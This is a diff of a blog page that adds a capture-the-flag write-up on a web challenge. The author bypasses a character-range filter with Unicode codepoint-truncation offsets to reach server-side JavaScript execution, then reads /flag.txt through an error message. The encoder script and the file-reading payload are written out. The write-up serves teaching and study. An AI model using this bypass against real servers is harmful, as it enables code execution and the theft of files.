@@ -6,21 +6,24 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Game TesterJust as a heads up, I’m going to be using the local instance to demonstrate the solve because at the time of publishing this writeup, the remote instance is no longer active. Additionally,">
+    <meta name="description" content="Just as a heads up, I’m going to be using the local instance to demonstrate the solve because at the time of publishing this writeup, the remote instance is no longer active. Additionally, source code">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Game Tester">
 <meta property="og:url" content="http://example.com/2025/07/27/Game-Tester/index.html">
 <meta property="og:site_name" content="valiumaggelein">
-<meta property="og:description" content="Game TesterJust as a heads up, I’m going to be using the local instance to demonstrate the solve because at the time of publishing this writeup, the remote instance is no longer active. Additionally,">
+<meta property="og:description" content="Just as a heads up, I’m going to be using the local instance to demonstrate the solve because at the time of publishing this writeup, the remote instance is no longer active. Additionally, source code">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/image.png">
 <meta property="og:image" content="http://example.com/images/image-1.png">
 <meta property="og:image" content="http://example.com/images/image-2.png">
 <meta property="og:image" content="http://example.com/images/image-3.png">
 <meta property="og:image" content="http://example.com/images/image-4.png">
+<meta property="og:image" content="http://example.com/images/1.png">
+<meta property="og:image" content="http://example.com/images/2.png">
 <meta property="article:published_time" content="2025-07-27T04:55:44.000Z">
-<meta property="article:modified_time" content="2025-07-28T06:50:31.994Z">
+<meta property="article:modified_time" content="2025-07-28T20:56:40.395Z">
 <meta property="article:author" content="valiumaggelein">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/image.png">
     
@@ -117,10 +120,6 @@
     </div>
     
     
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Game-Tester"><span class="toc-number">1.</span> <span class="toc-text">Game Tester</span></a></li></ol>
-      </div>
-    
   </span>
 </div>
 
@@ -152,6 +151,11 @@
       
 
       
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Web/" rel="tag">Web</a>
+    </div>
+
 
     </div>
   </header>
@@ -162,7 +166,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Game-Tester"><a href="#Game-Tester" class="headerlink" title="Game Tester"></a>Game Tester</h1><p><em><strong>Just as a heads up, I’m going to be using the local instance to demonstrate the solve because at the time of publishing this writeup, the remote instance is no longer active.</strong></em></p>
+    <p><em><strong>Just as a heads up, I’m going to be using the local instance to demonstrate the solve because at the time of publishing this writeup, the remote instance is no longer active.</strong></em></p>
 <p><em><strong>Additionally, source code was provided for this challenge.</strong></em></p>
 <hr>
 <br>
@@ -209,6 +213,35 @@
 
 <p>Anyways, I try running server-side JavaScript code and look at what I get as a response in Burpsuite, and I see this.</p>
 <p><img src="/../images/image-4.png" alt="alt text"></p>
+<p>What this tells me is that each character in the input form is encoded into Unicode, and put into the <code>codeArray</code> as seen in the <code>POST</code> request to <code>/admin</code>.</p>
+<p>To delve further into this, I decided to look at the logic for this page to see how it works under the hood.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;use server&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">runOnServer</span>(<span class="params">data: &#123; codeArray: string &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; codeArray &#125; = data;</span><br><span class="line">    <span class="keyword">if</span> (!codeArray || !codeArray.<span class="title function_">trim</span>()) <span class="keyword">return</span> <span class="string">&#x27;Please enter a valid string.&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> charCodes = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(codeArray);</span><br><span class="line">    <span class="keyword">if</span> (charCodes.<span class="title function_">some</span>(<span class="function">(<span class="params">n: number</span>) =&gt;</span> n &gt;= <span class="number">65</span> &amp;&amp; n &lt;= <span class="number">122</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid character detected.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> verified_code = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(...charCodes);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">new</span> <span class="title class_">Function</span>(verified_code)();</span><br><span class="line">    <span class="keyword">return</span> result !== <span class="literal">undefined</span> ? <span class="title class_">String</span>(result) : <span class="string">&#x27;Code executed successfully.&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="attr">e</span>: any) &#123;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">message</span> || <span class="string">&#x27;Error occurred while executing code.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>This is the logic for the server-side JS execution. As you can see in the 2nd if statement, it checks for UTF-16 values in between 65 and 122, since the charCodes object uses UTF-16 encoding. If the values entered (in this case the characters from the server-side JS command you’re trying to run) fall in that range, it just throws an error saying “Invalid character detected,” essentially working as a filter to try &amp; filter out malicious code.</p>
+<br>
+
+<p>After trying various methods that ended up ultimately not working, I simply googled “Unicode range bypass” and came across this article: <a target="_blank" rel="noopener" href="https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows">Bypassing character blocklists with unicode overflows</a>.</p>
+<br>
+
+<p>What this research essentially says is that since this JS object uses UTF-16 encoding, it can store data up to 16 bits, meaning that the maximum value is 65536. The attack, called “Unicode codepoint truncation” basically outlines that you can perform a buffer overflow on this maximum value, and if you were to store, say the number 65537, it would be treated as a 0, 65538 would be treated as a 1, and so on. This is our attack vector.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;codeArray&quot;:&quot;[97,108,101,114,116,40,49,41]&quot;</span><br></pre></td></tr></table></figure>
+<p>If we want to test code execution with “alert(1)”, instead of having our <code>codeArray</code> look like the above, we offset each number in the array by 65536 to bypass the WAF. I wrote a quick Python script to generate the numbers with the required offset.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OFFSET = <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">js = <span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">code_array = [<span class="built_in">ord</span>(c) + OFFSET <span class="keyword">for</span> c <span class="keyword">in</span> js]</span><br><span class="line"><span class="built_in">print</span>(code_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output:</span></span><br><span class="line">[<span class="number">65633</span>, <span class="number">65644</span>, <span class="number">65637</span>, <span class="number">65650</span>, <span class="number">65652</span>, <span class="number">65576</span>, <span class="number">65585</span>, <span class="number">65577</span>]</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>Upon using this payload, we can see that our <code>alert(1)</code> command was actually executed server-side, but we did get an error message saying it wasn’t defined. This confirms that the server-side command execution is working.</p>
+<p><img src="/../images/1.png" alt="alt text"></p>
+<br>
+
+<p>Now that I’ve figured this out, I decided to test a multitude of different commands to see if I can exfil the flag, but I ended up finding out that all outbound connections from this box are blocked, so I was stuck. I decided to look at the source code again &amp; see if I could find anything that might help.</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">runOnServer</span>(<span class="params"><span class="attr">data</span>: &#123; codeArray: <span class="built_in">string</span> &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; codeArray &#125; = data;</span><br><span class="line">    <span class="keyword">if</span> (!codeArray || !codeArray.<span class="title function_">trim</span>()) <span class="keyword">return</span> <span class="string">&#x27;Please enter a valid string.&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> charCodes = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(codeArray);</span><br><span class="line">    <span class="keyword">if</span> (charCodes.<span class="title function_">some</span>(<span class="function">(<span class="params"><span class="attr">n</span>: <span class="built_in">number</span></span>) =&gt;</span> n &gt;= <span class="number">65</span> &amp;&amp; n &lt;= <span class="number">122</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid character detected.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> verified_code = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(...charCodes);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">new</span> <span class="title class_">Function</span>(verified_code)();</span><br><span class="line">    <span class="keyword">return</span> result !== <span class="literal">undefined</span> ? <span class="title class_">String</span>(result) : <span class="string">&#x27;Code executed successfully.&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="attr">e</span>: <span class="built_in">any</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">message</span> || <span class="string">&#x27;Error occurred while executing code.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<br>
+
+<p>After reading this code ad nauseam, I noticed that the error message from the try-catch statement is returned &amp; appended to the HTTP response when running commands. After finding this out, I thought maybe: if I read the contents of <code>/flag.txt</code>, save it to a variable, and throw the variable as an error, it would give me the flag? I built a payload that would throw an error, encoded it to UTF-16 with the <code>0x10000</code> offset, and sent the payload off.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<br>
+
+<p>Upon encoding this payload &amp; sending the HTTP request, I finally received the flag back.<br><img src="/../images/2.png" alt="alt text"></p>
 
   </div>
 </article>
@@ -238,10 +271,6 @@
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Game-Tester"><span class="toc-number">1.</span> <span class="toc-text">Game Tester</span></a></li></ol>
-      </div>
-    
 
     <div id="share-footer" style="display: none">
       <ul>
@@ -262,8 +291,6 @@
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
